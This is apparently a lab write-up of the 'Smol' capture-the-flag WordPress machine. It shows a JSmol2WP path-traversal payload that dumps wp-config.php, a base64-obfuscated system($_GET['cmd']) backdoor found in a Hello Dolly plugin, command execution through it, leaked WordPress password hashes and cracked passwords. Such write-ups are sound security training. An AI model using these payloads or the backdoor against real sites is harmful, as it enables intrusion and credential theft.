# Writeup

## Objective
At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.

Quick Tips: Do you know that on computers without GPU like the AttackBox, John The Ripper is faster than Hashcat?

## Target
10.201.8.164	www.smol.thm
## Steps Taken
- First the box was enumerated to discover what version of wordpress was being used. The site is running version 6.7.1 of wordpress.
- using exploitdb a vulnerable plugin was discovered for WordPress Theme Newspaper 6.7.1 - Privilege Escalation. however the username and password must be discovered first. On the main page and the result from the whatweb result the administrator email address was discovered to be `admin@smol.thm`
- I began a password spray using rockyou.txt against the admin login page. While inspecting the webpage manually while that was running I discovered a library that was being used identified in a script tag
`http://www.smol.thm/wp-content/plugins/jsmol2wp/JSmol.min.nojq.js?ver=14.1.7_2014.06.09`
- documentation was found for a vulnerability in a similar library can be found here: https://www.exploit-db.com/exploits/46881. the following poc was tried without success `http://www.smol.thm/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd`
- Next I ran a wpscan against the site with results listed in the information gathering section of this writeup. The interesting points from the scan included a directory named uploads that was available, which included a directory called `wysija` which according to this exploitdb post may be vulnerable to unauthenticated file uploads. https://www.exploit-db.com/exploits/33991
- The above exploit did not complete successfully however it was discovered that a potential vulnerability exists in the JSmol2WP plugin discovered, the documentation from wpscan can be found here: https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/. the following proof of concept code was tried against the server. `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`
- Great Success! This lead to a full dump of the configureation file which contains the plaintext details for the database
```
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
```
- The database username and passwrd were successful for logging into the wordpress administrator page! There was a hidden post for the webmaster to do which included looking for backdoors in a plugin called "Hello Dolly". 
- The page exists here: `http://www.smol.thm/wp-content/plugins/hello.php` it is a simple plugin that will produce a quote from the tv show hello dolly at the top of the page. By using the vulnerability earlier discovered we can then check to see what the php source code is `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php`
- an interesting eval function exists on the hello.php page `eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));`
- This decodes to:
`if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }`
- the above will execute a command if the `cmd` url is supplied to the rendered webpage. Allthough I attempted this earlier on teh hello.php page I did not think to try it against a fully rendered page. After using the following url: `http://www.smol.thm/wp-admin/edit.php?cmd=ls` i was able to list files in the current directory and then upload a webshell to the server.
- After some digging around I discovered a file in the /opt/ directory named wp_backup.sql. Which contained the full wp-database. The password section of the database 
```
INSERT INTO `wp_users` VALUES (1,'admin','$P$Bvi8BHb84pjY/Kw0RWsOXUXsQ1aACL1','admin','admin@smol.thm','http://192.168.204.139','2023-08-16 06:58:30','',0,'admin'),(2,'wpuser','$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.','wp','wp@smol.thm','http://smol.thm','2023-08-16 11:04:07','',0,'wordpress user'),(3,'think','$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/','think','josemlwdf@smol.thm','http://smol.thm','2023-08-16 15:01:02','',0,'Jose Mario Llado Marti'),(4,'gege','$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1','gege','gege@smol.thm','http://smol.thm','2023-08-17 20:18:50','',0,'gege'),(5,'diego','$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1','diego','diego@smol.thm','http://smol.thm','2023-08-17 20:19:15','',0,'diego'),(6,'xavi','$P$BvcalhsCfVILp2SgttADny40mqJZCN/','xavi','xavi@smol.thm','http://smol.thm','2023-08-17 20:20:01','',0,'xavi');
```
- So the hashed passwords were put into a file in the following format were cracked using the following command john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --fork 16

```
admin:$P$Bvi8BHb84pjY/Kw0RWsOXUXsQ1aACL1
wpuser:$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
think:$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/
gege:$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BvcalhsCfVILp2SgttADny40mqJZCN/
```
- the following passwords were cracked:
```
diego:sandiegocalifornia
gege:hero_gege@hotmail.com

```
- The user diego had the user.txt flag in the root directory which was as follows `45edaec653ff9ee06236b7ce72b86963`.
- The script linpriveschecker.sh was run as the target user. 


## Information Gathering
- Whatweb scan result
```
http://www.smol.thm [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[admin@smol.thm], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.201.8.164], JQuery[3.7.1], MetaGenerator[WordPress 6.7.1], Script[importmap,module], Title[AnotherCTF], UncommonHeaders[link], WordPress[6.7.1]
```
- Discovered software version vulnerabilities
```

```
- Discovered known vulnerabilities
```

```
- Impactful vulnerabilities
```

```
- Manually discovered pages of interest
```

```
- Nikto/Dirbuster scan results
```

```
- wpscan results
```
wpscan --url www.smol.thm
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://www.smol.thm/ [10.201.8.164]
[+] Started: Mon Sep  1 20:34:47 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <> (101 / 137) 73.72%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:06 <> (103 / 137) 75.18%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:06 <> (105 / 137) 76.64%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:06 <> (108 / 137) 78.83%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:06 <> (109 / 137) 79.56%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:06 <> (113 / 137) 82.48%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:06 <> (114 / 137) 83.21%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:07 <> (118 / 137) 86.13%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:07 <> (119 / 137) 86.86%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:07 <> (123 / 137) 89.78%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:07 <> (124 / 137) 90.51%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:07 <> (127 / 137) 92.70%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:07 <> (128 / 137) 93.43%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:07 <> (129 / 137) 94.16%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:07 <> (132 / 137) 96.35%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:07 <> (133 / 137) 97.08%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:07 <> (134 / 137) 97.81%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:07 <> (137 / 137) 100.00% Time: 00:00:07

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Sep  1 20:35:05 2025
[+] Requests Done: 187
[+] Cached Requests: 5
[+] Data Sent: 45.48 KB
[+] Data Received: 22.554 MB
[+] Memory used: 272.625 MB
[+] Elapsed time: 00:00:18
```

## Reccomendations


## Cleanup


## Additional Information
